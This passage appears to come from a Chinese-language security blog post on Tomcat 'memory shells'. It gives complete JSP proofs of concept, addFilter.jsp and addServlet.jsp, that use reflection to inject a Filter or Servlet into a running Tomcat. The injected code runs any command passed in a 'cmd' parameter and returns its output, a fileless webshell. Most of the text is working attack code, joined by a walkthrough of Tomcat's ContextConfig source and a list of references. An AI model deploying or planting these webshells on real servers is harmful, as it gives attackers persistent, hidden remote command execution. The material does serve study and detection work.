import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Context\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/11/2 Time: 13:42 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%! //有回显的 JSP public class ShellFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, req.getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, req.getParameter(\u0026#34;cmd\u0026#34;)}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(output); resp.getWriter().flush(); } chain.doFilter(request, response); } public void init(FilterConfig config) throws ServletException { } } %\u0026gt; \u0026lt;% // 1.获取 StandardContext 对象 ServletContext servletContext = request.getServletContext(); Field applicationContextFiled = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); applicationContextFiled.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); standardContextField.setAccessible(true); StandardContext StandardContext = (StandardContext) standardContextField.get(applicationContext); ShellFilter filter = new ShellFilter(); // 3. 使用 FilterDef 封装 filter String name = \u0026#34;CommonFilter\u0026#34;; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); StandardContext.addFilterDef(filterDef); // 2. 创建 filterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); StandardContext.addFilterMapBefore(filterMap); // 4.封装 filterConfig 和 filterDef 到 filterConfigs Field Configs = StandardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(StandardContext); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(StandardContext, filterDef); filterConfigs.put(name, filterConfig); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1.4 利用： 先访问 addFilter.jsp 写入内存马：\npom.xml\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.105\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 替换注释：\nplain\r1 2 3 4 5 6 7 8 9 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;HelloWorld\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.src.tomcatdemo.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;HelloWorld\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello-servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 先写一个恶意类测试： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package com.src.tomcatdemo; import javax.servlet.*; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; // 基础恶意类 public class ServletTest implements Servlet { @Override public void init(ServletConfig config) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\u0026#34;cmd\u0026#34;); if (cmd !=null){ try{ Process process = Runtime.getRuntime().exec(cmd); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.readLine()) != null){ res.getWriter().println(line); } }catch (IOException e){ e.printStackTrace(); }catch (NullPointerException n){ n.printStackTrace(); } } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } web.xml 配置：\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.src.tomcatdemo.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 2. Servlet 内存马 Servlet（Server Applet）是 Java Servlet 的简称，称为小服务程序或服务连接器，用来读取客户端发送的数据，处理并返回结果。\n2.1 环境创建： pom.xml\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.105\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 替换注释：\nplain\r1 2 3 4 5 6 7 8 9 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;HelloWorld\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.src.tomcatdemo.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;HelloWorld\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello-servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 先写一个恶意类测试： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package com.src.tomcatdemo; import javax.servlet.*; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; // 基础恶意类 public class ServletTest implements Servlet { @Override public void init(ServletConfig config) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\u0026#34;cmd\u0026#34;); if (cmd !=null){ try{ Process process = Runtime.getRuntime().exec(cmd); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.readLine()) != null){ res.getWriter().println(line); } }catch (IOException e){ e.printStackTrace(); }catch (NullPointerException n){ n.printStackTrace(); } } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } web.xml 配置：\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.src.tomcatdemo.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 2.2 流程分析： 前置流程： 因为 Web 应用程序的顺序是 Listener —\u0026gt; Filter —\u0026gt; Servlet，所以我们在调用 Servlet 的时候也会看到 Listener 和 Filter 的流程\n首先根据上图流程跟到 configureStart() 完成启动配置，解析 web.xml\n**xml 赋值对象：**从 web.xml 配置文件中读取配置信息（如 Servlet、Filter 参数），并将其转化为内存中的 Java 对象（如 ServletDef、FilterDef）。\nconfigureContext() :\n用于配置 Context 对象（代表一个 Web 应用）在这个方法中，会进行一系列初始化操作，比如注册 Filter、Servlet 等。\ncontext.addFilterDef(filter):\n将解析得到的 FilterDef（Filter 定义对象）添加到 Context 中。\nFilterDef 包含 Filter 的名称、类名、初始化参数等。\ncontext.addFilterMap(filterMap): 将 Filter 的映射关系（即哪些 URL 或 Servlet 会被该 Filter 拦截）添加到 Context 中。\n每个servlet包装成wrapper对象: 这是 Servlet 容器中的关键设计：每个 Servlet 都被封装为一个 Wrapper 对象。\nWrapper 是 Tomcat 容器体系中的最底层容器，专门用于管理一个 Servlet 的生命周期。\n创建与装载 StandardWrapper java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 public class ContextConfig implements LifecycleListener { ... //将解析好的 web.xml 配置到 web 应用 private void configureContext(WebXml webxml) { // As far as possible, process in alphabetical order so it is easy to // check everything is present // Some validation depends on correct public ID context.setPublicId(webxml.getPublicId()); // Everything else in order context.setEffectiveMajorVersion(webxml.getMajorVersion()); context.setEffectiveMinorVersion(webxml.getMinorVersion()); //参数和基础属性配置 for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getContextParams().entrySet()) { context.addParameter(entry.getKey(), entry.getValue()); } context.setDenyUncoveredHttpMethods(webxml.getDenyUncoveredHttpMethods()); context.setDisplayName(webxml.getDisplayName()); context.setDistributable(webxml.isDistributable()); //JNDI 资源配置 for (ContextLocalEjb ejbLocalRef : webxml.getEjbLocalRefs().values()) { context.getNamingResources().addLocalEjb(ejbLocalRef); } for (ContextEjb ejbRef : webxml.getEjbRefs().values()) { context.getNamingResources().addEjb(ejbRef); } for (ContextEnvironment environment : webxml.getEnvEntries().values()) { context.getNamingResources().addEnvironment(environment); } //Web 组件配置 //错误页面 for (ErrorPage errorPage : webxml.getErrorPages().values()) { context.addErrorPage(errorPage); } //Filter 配置 for (FilterDef filter : webxml.getFilters().values()) { if (filter.getAsyncSupported() == null) { filter.setAsyncSupported(\u0026#34;false\u0026#34;); } context.addFilterDef(filter); } for (FilterMap filterMap : webxml.getFilterMappings()) { context.addFilterMap(filterMap); } context.setJspConfigDescriptor(webxml.getJspConfigDescriptor()); //listener 配置 for (String listener : webxml.getListeners()) { context.addApplicationListener(listener); } for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getLocaleEncodingMappings().entrySet()) { context.addLocaleEncodingMappingParameter(entry.getKey(), entry.getValue()); } // Prevents IAE if (webxml.getLoginConfig() != null) { context.setLoginConfig(webxml.getLoginConfig()); } for (MessageDestinationRef mdr : webxml.getMessageDestinationRefs().values()) { context.getNamingResources().addMessageDestinationRef(mdr); } // messageDestinations were ignored in Tomcat 6, so ignore here context.setIgnoreAnnotations(webxml.isMetadataComplete()); for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getMimeMappings().entrySet()) { context.addMimeMapping(entry.getKey(), entry.getValue()); } context.setRequestCharacterEncoding(webxml.getRequestCharacterEncoding()); // Name is just used for ordering for (ContextResourceEnvRef resource : webxml.getResourceEnvRefs().values()) { context.getNamingResources().addResourceEnvRef(resource); } for (ContextResource resource : webxml.getResourceRefs().values()) { context.getNamingResources().addResource(resource); } context.setResponseCharacterEncoding(webxml.getResponseCharacterEncoding()); boolean allAuthenticatedUsersIsAppRole = webxml.getSecurityRoles().contains(SecurityConstraint.ROLE_ALL_AUTHENTICATED_USERS); for (SecurityConstraint constraint : webxml.getSecurityConstraints()) { if (allAuthenticatedUsersIsAppRole) { constraint.treatAllAuthenticatedUsersAsApplicationRole(); } context.addConstraint(constraint); } for (String role : webxml.getSecurityRoles()) { context.addSecurityRole(role); } for (ContextService service : webxml.getServiceRefs().values()) { context.getNamingResources().addService(service); } /* 核心部分 -- Servlet 配置 */ for (ServletDef servlet : webxml.getServlets().values()) { //创建 Servlet 包装器 wrapper Wrapper wrapper = context.createWrapper(); // Description is ignored // Display name is ignored // Icons are ignored // jsp-file gets passed to the JSP Servlet as an init-param //设置启动加载顺序 if (servlet.getLoadOnStartup() != null) { wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); } //设置 Servlet 启用状态 if (servlet.getEnabled() != null) { wrapper.setEnabled(servlet.getEnabled().booleanValue()); } //获取 Servlet 名称 wrapper.setName(servlet.getServletName()); Map\u0026lt;String,String\u0026gt; params = servlet.getParameterMap(); for (Entry\u0026lt;String,String\u0026gt; entry : params.entrySet()) { wrapper.addInitParameter(entry.getKey(), entry.getValue()); } //获取运行身份 wrapper.setRunAs(servlet.getRunAs()); Set\u0026lt;SecurityRoleRef\u0026gt; roleRefs = servlet.getSecurityRoleRefs(); for (SecurityRoleRef roleRef : roleRefs) { wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink()); } //获取 Servlet 类名 wrapper.setServletClass(servlet.getServletClass()); //配置文件上传设置 MultipartDef multipartdef = servlet.getMultipartDef(); if (multipartdef != null) { long maxFileSize = -1; long maxRequestSize = -1; int fileSizeThreshold = 0; if (null != multipartdef.getMaxFileSize()) { maxFileSize = Long.parseLong(multipartdef.getMaxFileSize()); } if (null != multipartdef.getMaxRequestSize()) { maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize()); } if (null != multipartdef.getFileSizeThreshold()) { fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold()); } wrapper.setMultipartConfigElement(new MultipartConfigElement(multipartdef.getLocation(), maxFileSize, maxRequestSize, fileSizeThreshold)); } if (servlet.getAsyncSupported() != null) { wrapper.setAsyncSupported(servlet.getAsyncSupported().booleanValue()); } wrapper.setOverridable(servlet.isOverridable()); context.addChild(wrapper); } //Servlet URL 映射 配置路径 for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue()); } //Session 配置 SessionConfig sessionConfig = webxml.getSessionConfig(); if (sessionConfig != null) { if (sessionConfig.getSessionTimeout() != null) { context.setSessionTimeout(sessionConfig.getSessionTimeout().intValue()); } SessionCookieConfig scc = context.getServletContext().getSessionCookieConfig(); scc.setName(sessionConfig.getCookieName()); scc.setDomain(sessionConfig.getCookieDomain()); scc.setPath(sessionConfig.getCookiePath()); scc.setComment(sessionConfig.getCookieComment()); if (sessionConfig.getCookieHttpOnly() != null) { scc.setHttpOnly(sessionConfig.getCookieHttpOnly().booleanValue()); } if (sessionConfig.getCookieSecure() != null) { scc.setSecure(sessionConfig.getCookieSecure().booleanValue()); } if (sessionConfig.getCookieMaxAge() != null) { scc.setMaxAge(sessionConfig.getCookieMaxAge().intValue()); } if (!sessionConfig.getSessionTrackingModes().isEmpty()) { context.getServletContext().setSessionTrackingModes(sessionConfig.getSessionTrackingModes()); } } // Context doesn\u0026#39;t use version directly for (String welcomeFile : webxml.getWelcomeFiles()) { /* * The following will result in a welcome file of \u0026#34;\u0026#34; so don\u0026#39;t add that to the context \u0026lt;welcome-file-list\u0026gt; * \u0026lt;welcome-file/\u0026gt; \u0026lt;/welcome-file-list\u0026gt; */ if (welcomeFile != null \u0026amp;\u0026amp; !welcomeFile.isEmpty()) { context.addWelcomeFile(welcomeFile); } } // Do this last as it depends on servlets //JSP 属性 处理 for (JspPropertyGroup jspPropertyGroup : webxml.getJspPropertyGroups()) { String jspServletName = context.findServletMapping(\u0026#34;*.jsp\u0026#34;); if (jspServletName == null) { jspServletName = \u0026#34;jsp\u0026#34;; } if (context.findChild(jspServletName) != null) { for (String urlPattern : jspPropertyGroup.getUrlPatterns()) { context.addServletMappingDecoded(urlPattern, jspServletName, true); } } else { if (log.isDebugEnabled()) { for (String urlPattern : jspPropertyGroup.getUrlPatterns()) { log.debug(sm.getString(\u0026#34;contextConfig.noJsp\u0026#34;, urlPattern, jspServletName)); } } } } for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getPostConstructMethods().entrySet()) { context.addPostConstructMethod(entry.getKey(), entry.getValue()); } for (Entry\u0026lt;String,String\u0026gt; entry : webxml.getPreDestroyMethods().entrySet()) { context.addPreDestroyMethod(entry.getKey(), entry.getValue()); } } 断点调试： 此处的 WebXml 和 StandardContext 是 Servlet 注册所需的配置\n继续跟到创建 wrapper：\n根据 StandardContext 的内容创建 StandardWrapper，将 Servlet 放入 wrapper 中\nLoadOnStartup 是 Servlet 的启动顺序配置\n在 web.xml 中：\nxml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.Servlet\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;!-- 立即加载 --\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;LazyServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.LazyServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;5\u0026lt;/load-on-startup\u0026gt; \u0026lt;!-- 延迟加载 --\u0026gt; \u0026lt;/servlet\u0026gt; 正数：启动时按数值顺序初始化 0 或正数：应用启动时立即初始化 负数：第一次请求时才初始化 未设置：默认第一次请求时初始化 text\r1 wrapper.setName(servlet.getServletName()); 给 wrapper 设置一个名字\n从创建 wrapper 时获取 servletName\nservletName=\u0026ldquo;default\u0026rdquo;（这些是系统内置的，需要跳过之后，获取到我们写好的）\n此时获取的 Name 为 ServletTest\ntext\r1 wrapper.setServletClass(servlet.getServletClass()); 获取全类名\ntext\r1 context.addChild(wrapper); 将 wrapper 放入 context\n这一步相当于 web.xml 中的：\nxml\r1 2 3 4 5 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.src.tomcatdemo.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; text\r1 context.addServletMappingDecoded(entry.getKey(), entry.getValue()); 获取 Servlet 的 URL 映射\n执行 web.xml 中的：\nxml\r1 2 3 4 \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 目前依旧是系统内置的 jsp\n获取到我们前面写的恶意类\n总结一下注册的大致流程： 创建一个包装器 wrapper 获取 Servlet 名字 获取 Servlet 类 将 wrapper 加入 context 获取 URL 映射 2.3 写恶意类 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/10/31 Time: 13:08 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%! public class HelloServlet extends HttpServlet { private String message; public void init() { message = \u0026#34;Hello World!\u0026#34;; } public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } public void destroy() { } } %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 2.4 注册进 tomcat 写好马后，第二步就是动态注册 servlet\n第一步：获取 standardContext 在 jsp 中有一个 request 对象，这个对象中存在一个 getServletContext 方法，会获取 servletContext\n动态调试，找到 request 对象获取的 servletContext 中存在 StandardContext\n接下来就利用反射获取：\nplain\r1 2 3 4 5 6 7 8 9 ServletContext servletContext = request.getServletContext(); Field applicationContextFiled = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); applicationContextFiled.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); standardContextField.setAccessible(true); StandardContext context = (StandardContext) standardContextField.get(applicationContext); 第二步：注册到 context plain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //创建一个 wrapper Wrapper wrapper = context.createWrapper(); //设置名字 wrapper.setName(\u0026#34;MemServlet\u0026#34;); //获取全类名 wrapper.setServletClass(MemServlet.class.getName()); //实例化 MemServlet 类 wrapper.setServlet(new MemServlet()); //放进 context context.addChild(wrapper); //设置路径和类名 context.addServletMappingDecoded(\u0026#34;/MemShell\u0026#34;,\u0026#34;MemServlet\u0026#34;); 完整的 POC：addServlet.jsp java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Wrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt;\u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/10/31 Time: 13:08 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%! public class MemServlet extends HttpServlet { private String message; public void init() { message = \u0026#34;Hello World!\u0026#34;; } // 计算机弹出 public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } public void destroy() { } // MemShell?cmd=whoami 任意命令执行 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\u0026#34;cmd\u0026#34;); if (cmd !=null){ try{ Process process = Runtime.getRuntime().exec(cmd); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.readLine()) != null){ res.getWriter().println(line); } }catch (IOException e){ e.printStackTrace(); }catch (NullPointerException n){ n.printStackTrace(); } } } } %\u0026gt; \u0026lt;% ServletContext servletContext = request.getServletContext(); Field applicationContextFiled = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); applicationContextFiled.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext); Field standardContextField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); standardContextField.setAccessible(true); StandardContext context = (StandardContext) standardContextField.get(applicationContext); //创建一个 wrapper Wrapper wrapper = context.createWrapper(); //设置名字 wrapper.setName(\u0026#34;MemServlet\u0026#34;); //获取全类名 wrapper.setServletClass(MemServlet.class.getName()); //实例化 MemServlet 类 wrapper.setServlet(new MemServlet()); //放进 context context.addChild(wrapper); //设置路径和类名 context.addServletMappingDecoded(\u0026#34;/MemShell\u0026#34;,\u0026#34;MemServlet\u0026#34;); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 2.5 利用 先去访问传上去的 addServlet.jsp 来创建一个 Servlet\n此时 MemServlet 已经写入了内存\n通过路径 /MemShell 访问：弹出计算器\n参考： 【原创】利用“进程注入”实现无文件不死webshell\nJava安全学习——内存马 - 枫のBlog\nSpring内存马 | CurlySean’s Blog\nJava Agent实现反序列化注入内存shell\nJavaWeb 内存马一周目通关攻略 | 素十八\nJavaWeb 内存马二周目通关攻略 | 素十八\nShell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com\nJava内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户\nJava 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客\nSpring型内存马分析\nServlet 简介 | 菜鸟教程\nSpring内存马学习\nSpring内存马——Controller/Interceptor构造\n[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)\nJava安全学习——ROME反序列化 - 枫のBlog （使用Javassist缩短恶意class）\nJava Agent实现反序列化注入内存shell\nAgent内存马 | CurlySean’s Blog\n","permalink":"http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87---tomcat-%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"\u003ch1 id=\"java-内存马第二篇---tomcat-内存马\"\u003eJava 内存马第二篇 - Tomcat 内存马\u003c/h1\u003e\n\u003ch1 id=\"二tomcat-内存马\"\u003e二、Tomcat 内存马\u003c/h1\u003e\n\u003ch2 id=\"1-filter-内存马\"\u003e1. Filter 内存马\u003c/h2\u003e\n\u003cp\u003eFilter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。\u003c/p\u003e","title":"Java 内存马第二篇 - Tomcat 内存马"},{"content":"Java 内存马第一篇 - 基础 一、基础： 1. 什么是内存马 无文件的 webshell\n内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 